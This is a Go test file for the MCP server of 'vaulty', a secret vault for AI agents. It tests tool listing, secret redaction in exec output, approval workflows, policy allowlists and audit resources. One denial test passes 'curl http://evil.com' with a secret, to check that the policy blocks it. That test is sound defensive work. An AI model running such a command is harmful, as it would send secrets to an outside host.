package mcp

import (
	"bytes"
	"encoding/json"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/djtouchette/vaulty/internal/audit"
	"github.com/djtouchette/vaulty/internal/policy"
	"github.com/djtouchette/vaulty/internal/vault"
)

type testEnv struct {
	handler   *Handler
	resources *ResourceHandler
	logPath   string
}

func setupTestEnv(t *testing.T) *testEnv {
	t.Helper()

	dir := t.TempDir()
	vaultPath := filepath.Join(dir, "test.age")
	pass := "testpass"

	if err := vault.Create(vaultPath, pass); err != nil {
		t.Fatalf("Create vault: %v", err)
	}

	v, err := vault.Open(vaultPath, pass)
	if err != nil {
		t.Fatalf("Open vault: %v", err)
	}
	v.Set("TEST_KEY", "secret_value_123")
	t.Cleanup(func() { v.Zero() })

	cfg := &policy.Config{
		Secrets: map[string]policy.SecretPolicy{
			"TEST_KEY": {
				Description:     "Test API key",
				AllowedDomains:  []string{"api.example.com"},
				AllowedCommands: []string{"echo"},
				InjectAs:        "bearer",
			},
		},
	}

	logPath := filepath.Join(dir, "audit.log")
	logger, err := audit.NewLogger(logPath)
	if err != nil {
		t.Fatalf("NewLogger: %v", err)
	}
	t.Cleanup(func() { logger.Close() })

	handler := NewHandler(v, cfg, logger)
	resources := NewResourceHandler(v, cfg, logger)

	return &testEnv{
		handler:   handler,
		resources: resources,
		logPath:   logPath,
	}
}

func setupTestHandler(t *testing.T) *Handler {
	t.Helper()
	return setupTestEnv(t).handler
}

func runServer(t *testing.T, env *testEnv, input string) []JSONRPCResponse {
	t.Helper()
	var output bytes.Buffer
	server := NewServer(env.handler, env.resources, strings.NewReader(input), &output)
	server.Run()

	var responses []JSONRPCResponse
	for _, line := range strings.Split(strings.TrimSpace(output.String()), "\n") {
		if line == "" {
			continue
		}
		var resp JSONRPCResponse
		if err := json.Unmarshal([]byte(line), &resp); err != nil {
			t.Fatalf("unmarshal response: %v (line: %s)", err, line)
		}
		responses = append(responses, resp)
	}
	return responses
}

func TestMCPInitialize(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}` + "\n"
	var output bytes.Buffer

	server := NewServer(env.handler, env.resources, strings.NewReader(input), &output)
	server.Run()

	var resp JSONRPCResponse
	if err := json.Unmarshal(output.Bytes(), &resp); err != nil {
		t.Fatalf("unmarshal response: %v", err)
	}

	if resp.ID != float64(1) {
		t.Errorf("ID = %v, want 1", resp.ID)
	}
	if resp.Error != nil {
		t.Errorf("unexpected error: %v", resp.Error)
	}

	result, ok := resp.Result.(map[string]any)
	if !ok {
		t.Fatal("result is not a map")
	}
	if result["protocolVersion"] != protocolVersion {
		t.Errorf("protocolVersion = %v", result["protocolVersion"])
	}

	// Check resources capability is advertised
	caps, ok := result["capabilities"].(map[string]any)
	if !ok {
		t.Fatal("capabilities is not a map")
	}
	if _, ok := caps["resources"]; !ok {
		t.Error("resources capability not advertised")
	}
}

func TestMCPToolsList(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":2,"method":"tools/list"}` + "\n"
	var output bytes.Buffer

	server := NewServer(env.handler, env.resources, strings.NewReader(input), &output)
	server.Run()

	var resp JSONRPCResponse
	json.Unmarshal(output.Bytes(), &resp)

	result, ok := resp.Result.(map[string]any)
	if !ok {
		t.Fatal("result is not a map")
	}

	tools, ok := result["tools"].([]any)
	if !ok {
		t.Fatal("tools is not an array")
	}

	if len(tools) != 8 {
		t.Errorf("expected 8 tools, got %d", len(tools))
	}

	// Check tool names
	names := make(map[string]bool)
	for _, tool := range tools {
		toolMap := tool.(map[string]any)
		names[toolMap["name"].(string)] = true
	}
	expected := []string{
		"vaulty_request", "vaulty_exec", "vaulty_list",
		"vaulty_approve", "vaulty_pending",
		"vaulty_list_services", "vaulty_check_access", "vaulty_secret_metadata",
	}
	for _, name := range expected {
		if !names[name] {
			t.Errorf("missing tool: %s", name)
		}
	}
}

func TestMCPToolCallList(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"vaulty_list","arguments":{}}}` + "\n"
	var output bytes.Buffer

	server := NewServer(env.handler, env.resources, strings.NewReader(input), &output)
	server.Run()

	var resp JSONRPCResponse
	json.Unmarshal(output.Bytes(), &resp)

	result, ok := resp.Result.(map[string]any)
	if !ok {
		t.Fatal("result is not a map")
	}

	content, ok := result["content"].([]any)
	if !ok || len(content) == 0 {
		t.Fatal("content missing or empty")
	}

	text := content[0].(map[string]any)["text"].(string)
	if !strings.Contains(text, "TEST_KEY") {
		t.Errorf("list output should contain TEST_KEY, got %q", text)
	}
	if strings.Contains(text, "secret_value_123") {
		t.Error("list output should NOT contain secret values")
	}
}

func TestMCPToolCallExec(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("exec tests use Unix shell syntax")
	}
	env := setupTestEnv(t)

	// Set auto_approve so exec proceeds without approval
	env.handler.config.Secrets["TEST_KEY"] = policy.SecretPolicy{
		AllowedDomains:  []string{"api.example.com"},
		AllowedCommands: []string{"echo"},
		InjectAs:        "bearer",
		AutoApprove:     true,
	}

	input := `{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"vaulty_exec","arguments":{"command":"echo $TEST_KEY","secrets":["TEST_KEY"]}}}` + "\n"
	var output bytes.Buffer

	server := NewServer(env.handler, env.resources, strings.NewReader(input), &output)
	server.Run()

	var resp JSONRPCResponse
	json.Unmarshal(output.Bytes(), &resp)

	result, ok := resp.Result.(map[string]any)
	if !ok {
		t.Fatal("result is not a map")
	}

	// Should not be an error
	if isErr, ok := result["isError"]; ok && isErr.(bool) {
		content := result["content"].([]any)
		text := content[0].(map[string]any)["text"].(string)
		t.Fatalf("unexpected error: %s", text)
	}

	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)

	if strings.Contains(text, "secret_value_123") {
		t.Error("exec output should not contain raw secret")
	}
	if !strings.Contains(text, "[VAULTY:TEST_KEY]") {
		t.Errorf("exec output should contain redacted placeholder, got %q", text)
	}
}

func TestMCPToolCallDenied(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("exec tests use Unix shell syntax")
	}
	env := setupTestEnv(t)

	// Set auto_approve so it gets past approval to the policy check
	env.handler.config.Secrets["TEST_KEY"] = policy.SecretPolicy{
		AllowedDomains:  []string{"api.example.com"},
		AllowedCommands: []string{"echo"},
		InjectAs:        "bearer",
		AutoApprove:     true,
	}

	// Try to exec a command not in the allowlist
	input := `{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"vaulty_exec","arguments":{"command":"curl http://evil.com","secrets":["TEST_KEY"]}}}` + "\n"
	var output bytes.Buffer

	server := NewServer(env.handler, env.resources, strings.NewReader(input), &output)
	server.Run()

	var resp JSONRPCResponse
	json.Unmarshal(output.Bytes(), &resp)

	result, ok := resp.Result.(map[string]any)
	if !ok {
		t.Fatal("result is not a map")
	}

	isErr, ok := result["isError"]
	if !ok || !isErr.(bool) {
		t.Error("expected isError=true for denied command")
	}
}

// T-150: Approval workflow tests

func TestApprovalWorkflow(t *testing.T) {
	env := setupTestEnv(t)

	// Default: auto_approve is false, so request should return approval prompt
	input := `{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"vaulty_request","arguments":{"method":"GET","url":"https://api.example.com/data","secret_name":"TEST_KEY"}}}` + "\n"
	responses := runServer(t, env, input)

	if len(responses) != 1 {
		t.Fatalf("expected 1 response, got %d", len(responses))
	}

	result := responses[0].Result.(map[string]any)
	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)

	if !strings.Contains(text, "Approval required") {
		t.Fatalf("expected approval prompt, got %q", text)
	}
	if !strings.Contains(text, "approval-1") {
		t.Fatalf("expected approval ID, got %q", text)
	}
}

func TestApprovalApproveAndDeny(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("exec tests use Unix shell syntax")
	}
	env := setupTestEnv(t)

	// Create a pending exec approval
	env.handler.approvals.Create("TEST_KEY", "echo hello", "exec",
		json.RawMessage(`{"command":"echo hello","secrets":["TEST_KEY"]}`))

	// Deny it
	denyInput := `{"jsonrpc":"2.0","id":20,"method":"tools/call","params":{"name":"vaulty_approve","arguments":{"approval_id":"approval-1","decision":"deny"}}}` + "\n"
	responses := runServer(t, env, denyInput)
	if len(responses) != 1 {
		t.Fatalf("expected 1 response, got %d", len(responses))
	}

	result := responses[0].Result.(map[string]any)
	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)
	if !strings.Contains(text, "Denied") {
		t.Errorf("expected denial message, got %q", text)
	}

	// Create another and approve it
	env.handler.approvals.Create("TEST_KEY", "echo hello", "exec",
		json.RawMessage(`{"command":"echo hello","secrets":["TEST_KEY"]}`))

	approveInput := `{"jsonrpc":"2.0","id":21,"method":"tools/call","params":{"name":"vaulty_approve","arguments":{"approval_id":"approval-2","decision":"approve"}}}` + "\n"
	responses = runServer(t, env, approveInput)
	if len(responses) != 1 {
		t.Fatalf("expected 1 response, got %d", len(responses))
	}

	result = responses[0].Result.(map[string]any)
	if isErr, ok := result["isError"]; ok && isErr.(bool) {
		content = result["content"].([]any)
		text = content[0].(map[string]any)["text"].(string)
		t.Fatalf("unexpected error on approve: %s", text)
	}

	content = result["content"].([]any)
	text = content[0].(map[string]any)["text"].(string)
	// Should contain exec output (redacted)
	if !strings.Contains(text, "exit code") {
		t.Errorf("expected exec output after approval, got %q", text)
	}
}

func TestApprovalExpired(t *testing.T) {
	env := setupTestEnv(t)

	// Create a pending approval with 0 timeout (already expired)
	pa := env.handler.approvals.Create("TEST_KEY", "test", "proxy",
		json.RawMessage(`{}`))
	pa.ExpiresAt = pa.CreatedAt // already expired

	approveInput := `{"jsonrpc":"2.0","id":30,"method":"tools/call","params":{"name":"vaulty_approve","arguments":{"approval_id":"approval-1","decision":"approve"}}}` + "\n"
	responses := runServer(t, env, approveInput)

	result := responses[0].Result.(map[string]any)
	if isErr, ok := result["isError"]; !ok || !isErr.(bool) {
		t.Error("expected error for expired approval")
	}
}

func TestApprovalListPending(t *testing.T) {
	env := setupTestEnv(t)

	// No pending
	input := `{"jsonrpc":"2.0","id":40,"method":"tools/call","params":{"name":"vaulty_pending","arguments":{}}}` + "\n"
	responses := runServer(t, env, input)
	result := responses[0].Result.(map[string]any)
	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)
	if !strings.Contains(text, "No pending") {
		t.Errorf("expected no pending message, got %q", text)
	}

	// Create a pending approval
	env.handler.approvals.Create("TEST_KEY", "https://api.example.com", "proxy",
		json.RawMessage(`{}`))

	input = `{"jsonrpc":"2.0","id":41,"method":"tools/call","params":{"name":"vaulty_pending","arguments":{}}}` + "\n"
	responses = runServer(t, env, input)
	result = responses[0].Result.(map[string]any)
	content = result["content"].([]any)
	text = content[0].(map[string]any)["text"].(string)
	if !strings.Contains(text, "approval-1") {
		t.Errorf("expected pending approval in list, got %q", text)
	}
}

func TestAutoApproveSkipsWorkflow(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("exec tests use Unix shell syntax")
	}
	env := setupTestEnv(t)

	// Set auto_approve
	env.handler.config.Secrets["TEST_KEY"] = policy.SecretPolicy{
		AllowedDomains:  []string{"api.example.com"},
		AllowedCommands: []string{"echo"},
		InjectAs:        "bearer",
		AutoApprove:     true,
	}

	// Exec should proceed without approval
	input := `{"jsonrpc":"2.0","id":50,"method":"tools/call","params":{"name":"vaulty_exec","arguments":{"command":"echo test","secrets":["TEST_KEY"]}}}` + "\n"
	responses := runServer(t, env, input)

	result := responses[0].Result.(map[string]any)
	if isErr, ok := result["isError"]; ok && isErr.(bool) {
		content := result["content"].([]any)
		text := content[0].(map[string]any)["text"].(string)
		t.Fatalf("unexpected error: %s", text)
	}

	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)
	if strings.Contains(text, "Approval required") {
		t.Error("auto_approve should skip approval workflow")
	}
	if !strings.Contains(text, "exit code") {
		t.Errorf("expected exec output, got %q", text)
	}
}

// T-151: Discovery tools tests

func TestListServices(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":60,"method":"tools/call","params":{"name":"vaulty_list_services","arguments":{}}}` + "\n"
	responses := runServer(t, env, input)

	result := responses[0].Result.(map[string]any)
	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)

	if !strings.Contains(text, "TEST_KEY") {
		t.Errorf("expected TEST_KEY in services, got %q", text)
	}
	if !strings.Contains(text, "api.example.com") {
		t.Errorf("expected domain in services, got %q", text)
	}
	if !strings.Contains(text, "bearer") {
		t.Errorf("expected injection mode in services, got %q", text)
	}
	if strings.Contains(text, "secret_value_123") {
		t.Error("services list should NOT contain secret values")
	}
}

func TestCheckAccessMatching(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":61,"method":"tools/call","params":{"name":"vaulty_check_access","arguments":{"url":"https://api.example.com/users"}}}` + "\n"
	responses := runServer(t, env, input)

	result := responses[0].Result.(map[string]any)
	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)

	if !strings.Contains(text, "TEST_KEY") {
		t.Errorf("expected TEST_KEY for matching domain, got %q", text)
	}
}

func TestCheckAccessNoMatch(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":62,"method":"tools/call","params":{"name":"vaulty_check_access","arguments":{"url":"https://unknown.example.com/data"}}}` + "\n"
	responses := runServer(t, env, input)

	result := responses[0].Result.(map[string]any)
	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)

	if !strings.Contains(text, "No secrets have access") {
		t.Errorf("expected no access message, got %q", text)
	}
}

func TestSecretMetadata(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":63,"method":"tools/call","params":{"name":"vaulty_secret_metadata","arguments":{}}}` + "\n"
	responses := runServer(t, env, input)

	result := responses[0].Result.(map[string]any)
	content := result["content"].([]any)
	text := content[0].(map[string]any)["text"].(string)

	if !strings.Contains(text, "TEST_KEY") {
		t.Errorf("expected TEST_KEY in metadata, got %q", text)
	}
	if !strings.Contains(text, "Test API key") {
		t.Errorf("expected description in metadata, got %q", text)
	}
	if strings.Contains(text, "secret_value_123") {
		t.Error("metadata should NOT contain secret values")
	}
}

// T-152: Resource tests

func TestResourcesList(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":70,"method":"resources/list","params":{}}` + "\n"
	responses := runServer(t, env, input)

	if len(responses) != 1 {
		t.Fatalf("expected 1 response, got %d", len(responses))
	}

	result := responses[0].Result.(map[string]any)
	resources := result["resources"].([]any)

	if len(resources) != 3 {
		t.Errorf("expected 3 resources, got %d", len(resources))
	}

	uris := make(map[string]bool)
	for _, r := range resources {
		rm := r.(map[string]any)
		uris[rm["uri"].(string)] = true
	}
	for _, uri := range []string{"vaulty://secrets", "vaulty://policy", "vaulty://audit"} {
		if !uris[uri] {
			t.Errorf("missing resource: %s", uri)
		}
	}
}

func TestResourceReadSecrets(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":71,"method":"resources/read","params":{"uri":"vaulty://secrets"}}` + "\n"
	responses := runServer(t, env, input)

	result := responses[0].Result.(map[string]any)
	contents := result["contents"].([]any)
	text := contents[0].(map[string]any)["text"].(string)

	if !strings.Contains(text, "TEST_KEY") {
		t.Errorf("expected TEST_KEY in secrets resource, got %q", text)
	}
	if strings.Contains(text, "secret_value_123") {
		t.Error("secrets resource should NOT contain secret values")
	}
}

func TestResourceReadPolicy(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":72,"method":"resources/read","params":{"uri":"vaulty://policy"}}` + "\n"
	responses := runServer(t, env, input)

	result := responses[0].Result.(map[string]any)
	contents := result["contents"].([]any)
	text := contents[0].(map[string]any)["text"].(string)

	if !strings.Contains(text, "api.example.com") {
		t.Errorf("expected domain in policy resource, got %q", text)
	}
}

func TestResourceReadAudit(t *testing.T) {
	env := setupTestEnv(t)

	// Write an audit entry first
	env.handler.logger.Log(audit.Entry{
		Action: "test",
		Secret: "TEST_KEY",
		Target: "https://api.example.com",
	})

	input := `{"jsonrpc":"2.0","id":73,"method":"resources/read","params":{"uri":"vaulty://audit"}}` + "\n"
	responses := runServer(t, env, input)

	result := responses[0].Result.(map[string]any)
	contents := result["contents"].([]any)
	text := contents[0].(map[string]any)["text"].(string)

	if !strings.Contains(text, "TEST_KEY") {
		t.Errorf("expected audit entry in resource, got %q", text)
	}
}

func TestResourceReadUnknown(t *testing.T) {
	env := setupTestEnv(t)

	input := `{"jsonrpc":"2.0","id":74,"method":"resources/read","params":{"uri":"vaulty://unknown"}}` + "\n"
	responses := runServer(t, env, input)

	if responses[0].Error == nil {
		t.Error("expected error for unknown resource URI")
	}
}
